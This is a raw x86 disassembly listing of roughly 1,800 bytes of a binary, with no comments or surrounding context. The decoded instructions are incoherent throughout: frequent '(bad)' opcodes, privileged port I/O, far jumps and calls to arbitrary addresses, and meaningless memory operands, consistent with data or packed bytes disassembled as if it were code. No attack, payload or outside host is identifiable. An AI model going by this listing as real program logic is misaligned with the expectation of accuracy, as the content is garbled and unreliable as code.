  41fee4:	add    al,BYTE PTR [ecx+ecx*1+0xcdca4be]
  41feeb:	pop    es
  41feec:	sti    
  41feed:	mov    ds:0xbceb7303,eax
  41fef2:	push   0xc976ee97
  41fef7:	fiadd  DWORD PTR es:[ebx-0x2b0e01d5]
  41fefe:	bound  edi,QWORD PTR [edx+0xc353826]
  41ff04:	add    DWORD PTR [edi+0x126be1a9],eax
  41ff0a:	xchg   edi,eax
  41ff0b:	xor    DWORD PTR [ebp+0x40],ecx
  41ff0e:	fisttp QWORD PTR [ebx+0x27]
  41ff11:	xchg   BYTE PTR [ecx+0x61],dl
  41ff14:	push   ebp
  41ff15:	xor    DWORD PTR [edi+0x9373768],esp
  41ff1b:	out    0x9,eax
  41ff1d:	mov    BYTE PTR [esi],al
  41ff1f:	mov    dl,0xe3
  41ff21:	dec    esp
  41ff22:	mov    ds:0x2656d3a1,eax
  41ff27:	ss retf 
  41ff29:	sbb    ecx,ebp
  41ff2b:	stc    
  41ff2c:	fld    QWORD PTR [ecx]
  41ff2e:	mul    BYTE PTR [ebx-0x18d334f]
  41ff34:	test   eax,0x66163f0c
  41ff39:	dec    esi
  41ff3a:	sbb    eax,DWORD PTR [ebx+0x3a]
  41ff3d:	pushf  
  41ff3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff3f:	inc    edi
  41ff40:	mov    esi,0x393dccba
  41ff45:	out    dx,eax
  41ff46:	call   0x81909899
  41ff4b:	fisttp QWORD PTR [edx+0x360b5748]
  41ff51:	out    0x5b,eax
  41ff53:	test   ah,0xfc
  41ff56:	aas    
  41ff57:	les    edi,FWORD PTR [eax+0x2b49a902]
  41ff5d:	retf   0x8719
  41ff60:	lds    edx,FWORD PTR [edi]
  41ff62:	jle    0x41ff8d
  41ff64:	xchg   ebx,eax
  41ff65:	dec    eax
  41ff66:	mov    DWORD PTR [eax+esi*2],edi
  41ff69:	and    edi,eax
  41ff6b:	mov    eax,0x8cc4db65
  41ff70:	push   0x56
  41ff72:	call   FWORD PTR [edi+0x29]
  41ff75:	mov    bl,0x6c
  41ff77:	aaa    
  41ff78:	ja     0xe0460e2c
  41ff7e:	mov    WORD PTR [eax],?
  41ff80:	jo     0x41ff31
  41ff82:	mov    eax,ds:0xae08fc68
  41ff87:	rcr    bl,0xb7
  41ff8a:	lods   eax,DWORD PTR ds:[esi]
  41ff8b:	mov    eax,0x5a77bb2b
  41ff90:	call   0xc19ffeea
  41ff95:	and    DWORD PTR [eax+0xb566478],esi
  41ff9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff9c:	add    eax,0xb0ebf5d9
  41ffa1:	and    cl,ah
  41ffa3:	jb     0x41ff5e
  41ffa5:	jns    0x420021
  41ffa7:	pop    edx
  41ffa8:	fnstsw WORD PTR [ebx+0x2d0a6fdb]
  41ffae:	ins    DWORD PTR es:[edi],dx
  41ffaf:	xchg   edx,eax
  41ffb0:	lea    eax,[ebp+0x5dc5b786]
  41ffb6:	push   esi
  41ffb7:	(bad)  
  41ffb8:	out    dx,al
  41ffb9:	xchg   BYTE PTR [edi+0x58],bh
  41ffbc:	mov    dl,0x7d
  41ffbe:	push   ebp
  41ffbf:	les    ebp,FWORD PTR [ecx]
  41ffc1:	mov    ebp,0xe4001ed1
  41ffc6:	sbb    eax,ebp
  41ffc8:	add    DWORD PTR [edx-0x428d386e],edi
  41ffce:	cmp    al,0xf5
  41ffd0:	inc    esp
  41ffd1:	mov    ch,bl
  41ffd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffd4:	pop    eax
  41ffd5:	(bad)  
  41ffd6:	push   edx
  41ffd7:	jl     0x41ffde
  41ffd9:	ret    
  41ffda:	(bad)  
  41ffdc:	mov    cl,0x17
  41ffde:	fwait
  41ffdf:	sbb    eax,0x5d2909ce
  41ffe4:	out    dx,al
  41ffe5:	cmp    bh,BYTE PTR [ebx-0x1]
  41ffe8:	lods   al,BYTE PTR ds:[esi]
  41ffe9:	jle    0x420062
  41ffeb:	fild   QWORD PTR [ebx-0x74]
  41ffee:	cmpxchg bh,bh
  41fff1:	loop   0x42004a
  41fff3:	fisubr WORD PTR [ecx+0x1]
  41fff6:	test   DWORD PTR [edi],edx
  41fff8:	mov    ds:0x4aad15f3,eax
  41fffd:	cmp    edi,DWORD PTR [esi]
  41ffff:	pop    es
  420000:	dec    eax
  420001:	jp     0x42002e
  420003:	es inc bp
  420006:	rep ins BYTE PTR es:[edi],dx
  420008:	sub    al,0x85
  42000a:	xchg   esi,eax
  42000b:	mov    ch,0xeb
  42000d:	dec    ecx
  42000e:	inc    edi
  42000f:	out    dx,al
  420010:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420011:	rcr    DWORD PTR [ebp-0x78a91614],cl
  420017:	dec    edi
  420018:	lods   al,BYTE PTR ds:[esi]
  420019:	mov    eax,0x8b72b832
  42001e:	mov    al,0xc9
  420020:	sbb    DWORD PTR [ebp+0x42],ebx
  420023:	ins    DWORD PTR es:[edi],dx
  420024:	leave  
  420025:	lods   al,BYTE PTR ds:[esi]
  420026:	test   BYTE PTR [esi],ah
  420028:	inc    ecx
  420029:	mov    ebp,0xf9e3e773
  42002e:	jle    0x42005d
  420030:	push   edi
  420031:	lea    esp,[edi-0x62a4637c]
  420037:	cmp    al,0x3c
  420039:	xlat   BYTE PTR ds:[ebx]
  42003a:	mov    al,ds:0x1dc6f0d5
  42003f:	xor    DWORD PTR [ebx-0x42348848],ecx
  420045:	or     al,0x63
  420047:	sbb    eax,0x9188e035
  42004c:	sar    DWORD PTR [ecx],cl
  42004e:	out    0x21,eax
  420050:	fld    TBYTE PTR [eax+0x5ecab80d]
  420056:	int3   
  420057:	clc    
  420058:	in     eax,0xfc
  42005a:	lods   eax,DWORD PTR ds:[esi]
  42005b:	pop    ebp
  42005c:	icebp  
  42005d:	ror    DWORD PTR ds:0x3186852e,0x3d
  420064:	inc    esp
  420065:	mov    al,ds:0x4dc8e7e5
  42006a:	jae    0x42007c
  42006c:	push   DWORD PTR [edx]
  42006e:	dec    ebp
  42006f:	loopne 0x42003c
  420071:	xlat   BYTE PTR ds:[ebx]
  420072:	ss mov ah,0x62
  420075:	rcl    DWORD PTR [edi-0x18a5424c],cl
  42007b:	push   eax
  42007c:	(bad)  
  42007e:	add    BYTE PTR [esi+0x7e],ch
  420081:	push   ebx
  420082:	pop    ss
  420083:	pusha  
  420084:	pop    ebp
  420085:	dec    esi
  420086:	push   ecx
  420087:	or     eax,0x5c88f8e3
  42008c:	xchg   esp,eax
  42008d:	(bad)  
  42008e:	lock out 0x16,eax
  420091:	push   edx
  420092:	sar    BYTE PTR [edx],0xe5
  420095:	(bad)  
  420096:	mov    ds:0x440adc2c,eax
  42009b:	push   ecx
  42009c:	jmp    0x935fdbbb
  4200a1:	arpl   bx,si
  4200a3:	mov    eax,ds:0x60cef3e8
  4200a8:	aad    0xf2
  4200aa:	aas    
  4200ab:	dec    ebp
  4200ac:	xchg   ebp,eax
  4200ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200ae:	fnstsw WORD PTR [edi+0x38fb2287]
  4200b4:	push   edx
  4200b5:	adc    ebx,esi
  4200b7:	push   ebx
  4200b8:	leave  
  4200b9:	adc    DWORD PTR [ebx],0xf577adb5
  4200bf:	jg     0x4200c6
  4200c1:	ss cld 
  4200c3:	mov    eax,0xa20421ed
  4200c8:	arpl   WORD PTR [bx+0x37],di
  4200cc:	inc    edx
  4200cd:	icebp  
  4200ce:	scas   eax,DWORD PTR es:[edi]
  4200cf:	scas   eax,DWORD PTR es:[edi]
  4200d0:	int3   
  4200d1:	aas    
  4200d2:	daa    
  4200d3:	mov    esp,0x3311510e
  4200d8:	(bad)  
  4200d9:	sar    dl,1
  4200db:	adc    ebp,DWORD PTR [edi-0x68]
  4200de:	bound  ecx,QWORD PTR [edi-0x49e3e4ad]
  4200e4:	sbb    BYTE PTR fs:[edi+edx*2+0xc41b7cc],cl
  4200ec:	in     al,0xfe
  4200ee:	dec    esi
  4200ef:	add    edx,ebp
  4200f1:	iret   
  4200f2:	hlt    
  4200f3:	jge    0x42011e
  4200f5:	cwde   
  4200f6:	loope  0x4200dd
  4200f8:	(bad)  
  4200f9:	sub    eax,0x8f2ebe7b
  4200fe:	lds    ecx,FWORD PTR [edx+0x76]
  420101:	mov    esi,0x7b9572ba
  420106:	sahf   
  420107:	sbb    ebx,DWORD PTR [eax-0x347fdca3]
  42010d:	jg     0x42012f
  42010f:	inc    ebp
  420110:	adc    al,0x78
  420112:	mov    ch,0x9c
  420114:	data16 scas al,BYTE PTR es:[edi]
  420116:	adc    esi,DWORD PTR [eax-0x65]
  420119:	mov    edx,0x9ed69617
  42011e:	dec    eax
  42011f:	cmp    ebx,edi
  420121:	lahf   
  420122:	enter  0xee47,0x43
  420126:	retf   0x1ade
  420129:	test   DWORD PTR [edx-0x1dd983e4],edx
  42012f:	or     al,0xf
  420131:	jl     0x420178
  420133:	mov    bh,0x9c
  420135:	mov    bl,0x83
  420137:	jp     0x420139
  420139:	mov    bl,0x8e
  42013b:	psadbw mm2,QWORD PTR [ebx-0x17]
  42013f:	popf   
  420140:	retf   
  420141:	xor    al,ah
  420143:	js     0x420100
  420145:	xor    DWORD PTR [ebp+0x77],edx
  420148:	and    al,0xb5
  42014a:	adc    esi,DWORD PTR [ebx]
  42014c:	fisubr DWORD PTR [edx-0x12b9245]
  420152:	sahf   
  420153:	cli    
  420154:	adc    DWORD PTR [edx+0x4d],ebp
  420157:	push   0x43d5ee4a
  42015c:	sub    BYTE PTR [edx+0x2de9cb5e],ch
  420162:	push   ecx
  420163:	mov    ebx,DWORD PTR [esi+0x3cedfd4e]
  420169:	cld    
  42016a:	mov    al,ds:0xc79a0243
  42016f:	enter  0x4986,0x1c
  420173:	(bad)  
  420174:	std    
  420175:	ficom  DWORD PTR [ebx+0xd]
  420178:	or     ecx,DWORD PTR [esi+eiz*4-0x30]
  42017c:	cs jb  0x4201d2
  42017f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420180:	mov    edi,0x89d8ffc3
  420185:	les    eax,FWORD PTR [edx-0x4f]
  420188:	sbb    DWORD PTR [edi],0xc76b742f
  42018e:	(bad)  [eax+0x342d9f3f]
  420194:	iret   
  420195:	mov    eax,ds:0xe18cf4c9
  42019a:	es push esp
  42019c:	das    
  42019d:	add    dl,dh
  42019f:	sub    ah,al
  4201a1:	cmp    DWORD PTR [eax+0x71b7566],0x55eb019a
  4201ab:	mov    edi,0xb7c8ea7b
  4201b0:	icebp  
  4201b1:	fmul   st,st(4)
  4201b3:	test   eax,0xf1d59c69
  4201b8:	push   ebx
  4201b9:	inc    eax
  4201ba:	xchg   dh,ah
  4201bc:	xchg   BYTE PTR ds:0xda16025,ah
  4201c2:	rcl    al,0xb5
  4201c5:	sub    al,0x53
  4201c7:	pop    ecx
  4201c8:	push   edi
  4201c9:	pop    edx
  4201ca:	pop    ebx
  4201cb:	pop    ebp
  4201cc:	mov    WORD PTR ds:0xf6e551e4,es
  4201d2:	loopne 0x42018c
  4201d4:	aas    
  4201d5:	mov    bh,0x68
  4201d7:	inc    ecx
  4201d8:	in     eax,dx
  4201d9:	fistp  WORD PTR [ecx]
  4201db:	push   ecx
  4201dd:	or     DWORD PTR [edx+0x25],esp
  4201e0:	push   edi
  4201e1:	xor    esp,DWORD PTR [ebx]
  4201e3:	inc    esp
  4201e4:	push   esi
  4201e5:	dec    eax
  4201e6:	fdiv   DWORD PTR [ebx-0x5a]
  4201e9:	ins    DWORD PTR es:[edi],dx
  4201ea:	mov    cl,BYTE PTR [edx*2-0x17fba171]
  4201f1:	sbb    eax,0xa4d01062
  4201f6:	add    esi,esi
  4201f8:	aam    0xd6
  4201fa:	gs scas eax,DWORD PTR es:[edi]
  4201fc:	xchg   ecx,eax
  4201fd:	iret   
  4201fe:	stos   DWORD PTR es:[edi],eax
  4201ff:	cdq    
  420200:	xor    DWORD PTR [eax+0x74],ecx
  420203:	xchg   ebp,eax
  420204:	mov    DWORD PTR [eax],ecx
  420206:	sbb    DWORD PTR [edx-0x7d],0x99fbd8d4
  42020d:	mov    esp,0xbae31041
  420212:	cmp    ecx,esi
  420214:	enter  0xfed9,0x81
  420218:	or     BYTE PTR [edx-0x66],bl
  42021b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42021c:	pop    esi
  42021d:	arpl   WORD PTR [edx],cx
  42021f:	fucomp st(4)
  420221:	imul   ecx
  420223:	clc    
  420224:	and    BYTE PTR [eax],bh
  420226:	ins    BYTE PTR es:[edi],dx
  420227:	lds    edx,FWORD PTR [edx-0x3df74d85]
  42022d:	setnp  BYTE PTR [esi+0x7e8bdb21]
  420234:	test   eax,0xbfae320f
  420239:	mov    eax,ds:0x6bfcba4b
  42023e:	test   BYTE PTR [ebp+0xf],dl
  420241:	int3   
  420242:	add    BYTE PTR [eax],0xbf
  420245:	mov    esp,0x2fdf70e4
  42024a:	hlt    
  42024b:	(bad)  
  42024c:	pop    edi
  42024d:	sbb    eax,0x1915680a
  420252:	xchg   ebx,eax
  420253:	(bad)  
  420254:	inc    esi
  420255:	xchg   esp,eax
  420256:	adc    BYTE PTR [edx],ah
  420258:	or     ecx,DWORD PTR [esi+0x78]
  42025b:	test   DWORD PTR [eax-0x55],0x1a5dfcf8
  420262:	sbb    DWORD PTR [edx],esp
  420264:	and    DWORD PTR [ebp-0x109ef9e7],eax
  42026a:	not    DWORD PTR [esi+0x662f93c7]
  420270:	call   0xee7be8d2
  420275:	mov    esp,0x7a91ac56
  42027a:	das    
  42027b:	xor    DWORD PTR [ecx+edi*4],ebp
  42027e:	int    0x3f
  420280:	addr16 mov bh,0xfc
  420283:	in     eax,dx
  420284:	imul   eax,DWORD PTR [eax+eiz*4],0x93dc5e39
  42028b:	mov    edx,0xdbc95db
  420290:	arpl   di,di
  420292:	sbb    eax,0xdf7958ee
  420297:	retf   
  420298:	dec    ebx
  420299:	push   es
  42029a:	ret    0x208e
  42029d:	jmp    0xb61c:0x82178995
  4202a4:	rcl    BYTE PTR [edx+edx*1-0x471813dc],0x96
  4202ac:	sar    DWORD PTR [esi-0x6f],0x77
  4202b0:	sub    ah,0x87
  4202b3:	cmp    edi,DWORD PTR [edx+0x49]
  4202b6:	jo     0x420311
  4202b8:	frstor [ecx-0x6e]
  4202bb:	js     0x4202e3
  4202bd:	jae    0x4202e7
  4202bf:	push   ebx
  4202c0:	add    ebx,eax
  4202c2:	ins    DWORD PTR es:[edi],dx
  4202c3:	cmp    edi,ecx
  4202c5:	in     eax,dx
  4202c6:	retf   
  4202c7:	jns    0x42033e
  4202c9:	push   ebp
  4202ca:	std    
  4202cb:	les    eax,FWORD PTR [eax+0x28]
  4202ce:	inc    eax
  4202cf:	push   esi
  4202d0:	pop    ss
  4202d1:	mov    al,BYTE PTR [ebp-0xcd45c56]
  4202d7:	lds    edx,FWORD PTR [eax-0x7aa72bd]
  4202dd:	sub    al,0x43
  4202df:	xor    ecx,edi
  4202e1:	xchg   edi,eax
  4202e2:	shr    BYTE PTR [eax-0x771f983b],cl
  4202e8:	cdq    
  4202e9:	test   DWORD PTR [ebx],0x4487cebd
  4202ef:	sbb    al,0x9f
  4202f1:	rol    BYTE PTR [ecx-0x63],0x46
  4202f5:	test   DWORD PTR [edx],0x43534530
  4202fb:	pusha  
  4202fc:	icebp  
  4202fd:	idiv   BYTE PTR [eax+0x5a]
  420300:	lahf   
  420301:	adc    al,0x1c
  420303:	cmp    cl,BYTE PTR [eax-0x3de69730]
  420309:	lods   al,BYTE PTR ds:[esi]
  42030a:	loopne 0x420332
  42030c:	jecxz  0x420304
  42030e:	cdq    
  42030f:	adc    esi,DWORD PTR [esi]
  420311:	stos   BYTE PTR es:[edi],al
  420312:	rcr    BYTE PTR [eax+0x2b],1
  420315:	(bad)  
  420316:	mov    ch,0xed
  420318:	adc    edi,DWORD PTR [edi-0x7df7dfd6]
  42031e:	cld    
  42031f:	icebp  
  420320:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420321:	push   ebx
  420322:	push   ss
  420323:	mov    cl,0xdc
  420325:	cdq    
  420326:	xor    DWORD PTR [edi+ecx*1-0x9],edi
  42032a:	icebp  
  42032b:	push   ebp
  42032c:	cmp    DWORD PTR [ebx],edx
  42032e:	pop    esp
  42032f:	lods   eax,DWORD PTR ds:[esi]
  420330:	in     al,0xa2
  420332:	int    0x2f
  420334:	sub    DWORD PTR [ebx+ecx*2+0x21e1d95e],esp
  42033b:	add    ebp,ecx
  42033d:	push   es
  42033e:	sub    DWORD PTR [ebx+0x536dd2c2],esi
  420344:	mov    ds:0xefa08b9c,al
  420349:	sub    BYTE PTR [ebp+0x55],cl
  42034c:	(bad)  
  42034d:	cmp    ah,BYTE PTR [ecx]
  42034f:	in     al,0x0
  420351:	mov    dl,dh
  420353:	inc    DWORD PTR [edx-0x4b730824]
  420359:	and    DWORD PTR ds:0x149fe463,0x7f
  420360:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420362:	ds dec esi
  420364:	xor    edi,DWORD PTR [esi]
  420366:	ror    DWORD PTR [edi],0x3c
  420369:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42036a:	(bad)  ds:0xcff07570
  420370:	fisub  DWORD PTR [edi-0x5e]
  420373:	int3   
  420374:	xchg   ebp,eax
  420375:	mov    WORD PTR ds:[edx-0x52c0e6ac],?
  42037c:	and    ecx,DWORD PTR [eax]
  42037e:	shl    ebx,1
  420380:	mov    WORD PTR [ebx+0x557e08ad],gs
  420386:	cld    
  420387:	lods   eax,DWORD PTR ds:[esi]
  420388:	add    ecx,edi
  42038a:	and    DWORD PTR [ebp+ebp*4-0x68],ebp
  42038e:	(bad)  
  42038f:	fmul   QWORD PTR [ebx+0x1ff580f0]
  420395:	mov    ebp,DWORD PTR [ebx+0x6f49d7e7]
  42039b:	ss jl  0x4203a1
  42039e:	inc    esp
  42039f:	mov    ds:0xffa5036d,al
  4203a4:	xchg   ecx,eax
  4203a5:	aaa    
  4203a6:	repnz pop ebp
  4203a8:	push   edi
  4203a9:	test   BYTE PTR [edx+0x5049d121],ah
  4203af:	cld    
  4203b0:	std    
  4203b1:	cs call 0x7572:0xbd9f9351
  4203b9:	test   eax,0x3268160c
  4203be:	and    ch,BYTE PTR [ebp-0x32]
  4203c1:	adc    al,0xf0
  4203c3:	in     al,dx
  4203c4:	xchg   ebp,eax
  4203c5:	cld    
  4203c6:	js     0x420373
  4203c8:	jo     0x42035d
  4203ca:	add    ax,0xafbf
  4203ce:	out    dx,eax
  4203cf:	test   eax,0x3820b358
  4203d4:	dec    ecx
  4203d5:	cmp    BYTE PTR [edx],0x58
  4203d8:	jp     0x42036f
  4203da:	mov    ah,0x12
  4203dc:	mov    ds:0xa5077d3d,eax
  4203e1:	ja     0x4203d0
  4203e3:	mov    edx,0xa28f2152
  4203e8:	fnstenv [edx]
  4203ea:	dec    edx
  4203eb:	(bad)  
  4203ec:	pop    esp
  4203ed:	or     eax,0x1e40a351
  4203f2:	out    0x3f,al
  4203f4:	int3   
  4203f5:	sub    esi,DWORD PTR [ebx-0x17f2466a]
  4203fb:	stc    
  4203fc:	sub    edi,ecx
  4203fe:	mov    esp,0xb37a972c
  420403:	pop    edi
  420404:	mov    al,ds:0xf6e1afa3
  420409:	dec    edx
  42040a:	stos   BYTE PTR es:[edi],al
  42040b:	and    ah,dh
  42040d:	xchg   BYTE PTR [ebp-0x1d],dh
  420410:	inc    ebx
  420411:	or     al,0x85
  420413:	and    BYTE PTR [ebx+eiz*8-0x3f],ch
  420417:	imul   edi,DWORD PTR [eax-0x5b],0x35
  42041b:	inc    BYTE PTR [ebp+0x1d657831]
  420421:	aad    0x72
  420423:	mov    esp,0x60a24916
  420428:	popa   
  420429:	(bad)  
  42042b:	iret   
  42042c:	in     al,dx
  42042d:	data16 or al,0x9a
  420430:	nop
  420431:	dec    esp
  420432:	inc    ecx
  420433:	leave  
  420434:	mov    al,0xb5
  420436:	inc    esp
  420437:	or     al,0xa5
  420439:	(bad)  
  42043a:	and    ch,dl
  42043c:	retf   
  42043d:	mov    WORD PTR [edx-0x6842ddeb],es
  420443:	scas   eax,DWORD PTR es:[edi]
  420444:	mov    dl,0x50
  420446:	js     0x42048a
  420448:	xchg   DWORD PTR [eax],edx
  42044a:	mov    BYTE PTR [edx+0x763b18a8],dl
  420450:	scas   eax,DWORD PTR es:[edi]
  420451:	jge    0x420442
  420453:	xor    al,0xbf
  420455:	cmp    BYTE PTR [edx*1+0x55bf1938],0x46
  42045d:	pop    edx
  42045e:	sbb    bl,bl
  420460:	mov    bl,0x87
  420462:	push   0x12
  420464:	pusha  
  420465:	fidivr WORD PTR [eax-0x78]
  420468:	retf   0x5f0b
  42046b:	pop    ebx
  42046c:	lock retf 0xa68f
  420470:	mov    dh,0x38
  420472:	adc    BYTE PTR [ebx+0x68],ch
  420475:	and    eax,0xfa46f5f2
  42047a:	jmp    0x4204ca
  42047c:	push   cs
  42047d:	sub    al,0xc4
  42047f:	cli    
  420480:	test   eax,0x64b1bafa
  420485:	xor    BYTE PTR [edx+0x740e4ded],ch
  42048b:	nop    DWORD PTR [ecx*2-0x105add92]
  420493:	arpl   WORD PTR [eax+0x1f320cfc],bp
  420499:	sbb    ebp,DWORD PTR [ebx]
  42049b:	and    dh,BYTE PTR [ebx]
  42049d:	mov    esi,0x79739b70
  4204a2:	mov    DWORD PTR [ebx],ebp
  4204a4:	xlat   BYTE PTR ds:[ebx]
  4204a5:	mov    ch,0x47
  4204a7:	cli    
  4204a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204a9:	sbb    al,0x87
  4204ab:	inc    esi
  4204ac:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4204ae:	add    al,0x7c
  4204b0:	scas   eax,DWORD PTR es:[edi]
  4204b1:	scas   eax,DWORD PTR es:[edi]
  4204b2:	adc    edx,DWORD PTR ds:0x8404293a
  4204b8:	out    0x5a,eax
  4204ba:	xchg   ebp,eax
  4204bb:	call   0xee68d722
  4204c0:	ret    
  4204c1:	push   edx
  4204c2:	icebp  
  4204c3:	out    dx,al
  4204c4:	outs   dx,BYTE PTR ds:[esi]
  4204c5:	and    al,0xf5
  4204c7:	pop    ds
  4204c8:	pop    eax
  4204c9:	inc    ecx
  4204ca:	inc    eax
  4204cb:	cmp    eax,0x7c705406
  4204d0:	mov    edi,0x983c3093
  4204d5:	lds    ebp,FWORD PTR [esi-0xbad2a4b]
  4204db:	repnz pop esi
  4204dd:	in     eax,0xd
  4204df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204e0:	mov    esp,0x40871546
  4204e5:	cmp    al,0x2c
  4204e7:	xchg   edi,eax
  4204e8:	das    
  4204e9:	not    DWORD PTR [edi-0x76694a2e]
  4204ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204f0:	xor    al,0xf3
  4204f2:	ja     0x42049a
  4204f4:	mov    ebp,DWORD PTR [edx]
  4204f6:	in     eax,dx
  4204f7:	and    al,0xa1
  4204f9:	addr16 jmp edi
  4204fc:	dec    esi
  4204fd:	mov    bh,0xa4
  4204ff:	and    BYTE PTR [edx],bh
  420501:	mov    eax,0x39e241d7
  420506:	inc    esi
  420507:	mov    ah,0xee
  420509:	jecxz  0x420522
  42050b:	push   ebp
  42050c:	retf   0x4e74
  42050f:	dec    edx
  420510:	and    BYTE PTR [ecx+0x8676b1c],dl
  420516:	push   ebp
  420517:	mov    ebp,0x69b314eb
  42051c:	in     al,0xda
  42051e:	aad    0x26
  420520:	add    eax,0x2e93c7dd
  420525:	pushf  
  420526:	xchg   esi,eax
  420527:	adc    eax,0xc0d81675
  42052c:	inc    edi
  42052d:	ds test eax,0x673388d4
  420533:	cmp    BYTE PTR [esi+0x5a],bl
  420536:	stos   DWORD PTR es:[edi],eax
  420537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420538:	sbb    al,0x31
  42053a:	sbb    ch,ch
  42053c:	ret    0x8376
  42053f:	pop    edx
  420540:	and    cl,dh
  420542:	jg     0x420510
  420544:	out    dx,al
  420545:	dec    esp
  420546:	(bad)  
  420547:	dec    edi
  420548:	and    BYTE PTR [ebp-0x150b2eaa],bl
  42054e:	and    ecx,DWORD PTR [ebp+eax*1+0x67512a65]
  420555:	(bad)  
  420556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420557:	lods   eax,DWORD PTR ds:[esi]
  420558:	xchg   BYTE PTR [ecx-0x7b2bc22b],dh
  42055e:	test   eax,0x75e2ded
  420563:	push   ds
  420564:	pop    ss
  420565:	push   ss
  420566:	inc    ecx
  420567:	and    ebx,edi
  420569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42056a:	dec    eax
  42056c:	es dec edx
  42056e:	jg     0x4205db
  420570:	mov    dl,BYTE PTR [ecx+ebp*4]
  420573:	mov    ebp,0xca93c618
  420578:	push   edi
  420579:	adc    BYTE PTR [eax+0x58aaef9a],dh
  42057f:	add    al,0x86
  420581:	jmp    0x420591
  420583:	rol    ch,0x2
  420586:	cdq    
  420587:	rol    al,cl
  420589:	pop    ecx
  42058a:	xor    BYTE PTR [esi+0x63],0xcc
  42058e:	xor    edi,DWORD PTR [edi+0x27]
  420591:	sbb    bl,BYTE PTR [edx+0x65082f27]
  420597:	inc    esp
  420598:	lods   eax,DWORD PTR cs:[esi]
  42059a:	pusha  
  42059b:	or     BYTE PTR [ebx+0x14],ah
  42059e:	xchg   DWORD PTR ss:[esi+0x46],ebx
  4205a2:	jecxz  0x42052e
  4205a4:	nop
  4205a5:	mov    ebp,0xd4eda4d5
  4205aa:	sub    ebx,DWORD PTR [edx+0x73]
  4205ad:	repnz std 
  4205af:	int3   
  4205b0:	test   edx,ebp
  4205b2:	sbb    ch,BYTE PTR [edx+0x6b]
  4205b5:	(bad)  
  4205b6:	ret    
  4205b7:	mov    al,ds:0x3f60989f
  4205bc:	add    eax,DWORD PTR ss:[esi-0x3f82c823]
  4205c3:	pop    ebp
  4205c4:	popf   
  4205c5:	pop    ecx
  4205c6:	dec    ecx
  4205c7:	mov    esi,DWORD PTR [esi]
  4205c9:	inc    edi
  4205ca:	popa   
  4205cb:	idiv   BYTE PTR [ebx-0x2e]
  4205ce:	stos   DWORD PTR es:[edi],eax
  4205cf:	(bad)  
  4205d0:	mov    bl,0x20
  4205d2:	inc    ebp
  4205d3:	xor    DWORD PTR [eax+0x1a],esi
  4205d6:	jge    0x420625
  4205d8:	xor    esi,DWORD PTR [ebx+0x6b]
  4205db:	pushf  
  4205dc:	jl     0x42063a
  4205de:	sub    BYTE PTR [edx+0x65],dl
  4205e1:	dec    esp
  4205e2:	sbb    BYTE PTR [edi],ch
  4205e4:	adc    al,BYTE PTR [eax]
  4205e6:	pop    DWORD PTR [ebx-0xb]
  4205e9:	repz das 
  4205eb:	xchg   esp,eax
  4205ec:	push   cs
  4205ed:	aam    0xf4
  4205ef:	sub    al,0x76
  4205f1:	dec    ecx
  4205f2:	jle    0x4205b7
  4205f4:	fnsave [eax]
  4205f6:	pop    edx
  4205f7:	hlt    
  4205f8:	or     al,0xa7
  4205fa:	push   ecx
  4205fb:	or     DWORD PTR [esi],edx
  4205fd:	daa    
  4205fe:	bndstx [ebx+0x61e163c8],(bad)
  420605:	pushf  
  420606:	mov    al,ds:0x5a16258d
  42060b:	dec    esi
  42060c:	(bad)  [ebx]
  42060e:	xchg   ecx,eax
  42060f:	xchg   edi,eax
  420610:	xor    eax,0xca8dce20
  420615:	clc    
  420616:	jbe    0x420637
  420618:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420619:	es mov ?,dx
  42061d:	push   esi
  42061e:	push   cs
  42061f:	aam    0x3
  420621:	arpl   WORD PTR [ecx+0x1de2c0cb],si
  420627:	retf   
  420628:	pop    edx
  420629:	adc    BYTE PTR [edi+0x173a8a44],al
  42062f:	ror    DWORD PTR [ebx],cl
  420631:	sti    
  420632:	lods   al,BYTE PTR ds:[esi]
  420633:	cld    
  420634:	fdivr  DWORD PTR [esi+0xa]
  420637:	dec    eax
  420638:	jl     0x4205d1
  42063a:	call   0x5710:0x875d8b1f
  420641:	jo     0x420682
  420643:	test   DWORD PTR [ebx-0x8b01592],edi
  420649:	rcl    BYTE PTR [eax],0xf7
  42064c:	shl    BYTE PTR [esi],1
  42064e:	mov    eax,DWORD PTR [ecx-0x24]
  420651:	iret   
  420652:	xor    DWORD PTR [edi-0x4ef42214],0x31
  420659:	or     eax,0x695143c4
  42065e:	cdq    
  42065f:	inc    edi
  420660:	ss adc al,0xfa
  420663:	out    0xb0,eax
  420665:	xor    BYTE PTR [ebp+0x68],ch
  420668:	ficom  DWORD PTR [ebx-0x63]
  42066b:	push   edi
  42066c:	aaa    
  42066d:	popa   
  42066e:	xchg   esp,eax
  42066f:	mov    eax,ds:0xb289c4cc
  420674:	lahf   
  420675:	sub    DWORD PTR [esi-0x636f95b3],0x946ee835
  42067f:	mov    dh,0x47
  420681:	lea    edx,[eax+0x57]
  420684:	test   BYTE PTR [ebx-0x7ae27da1],ch
  42068a:	mov    edx,?
  42068c:	dec    ebx
  42068d:	sbb    al,0xe2
  42068f:	repnz pop eax
  420691:	hlt    
  420692:	fnstcw WORD PTR [eax+eax*4]
  420695:	mov    dh,0xa7
  420697:	aaa    
  420698:	and    eax,0xdb52edfb
  42069d:	std    
  42069e:	push   0x5b
  4206a0:	jl     0x420721
  4206a2:	cdq    
  4206a3:	mov    BYTE PTR [ecx],dh
  4206a5:	or     ebx,DWORD PTR [ecx]
  4206a7:	sbb    ebp,ecx
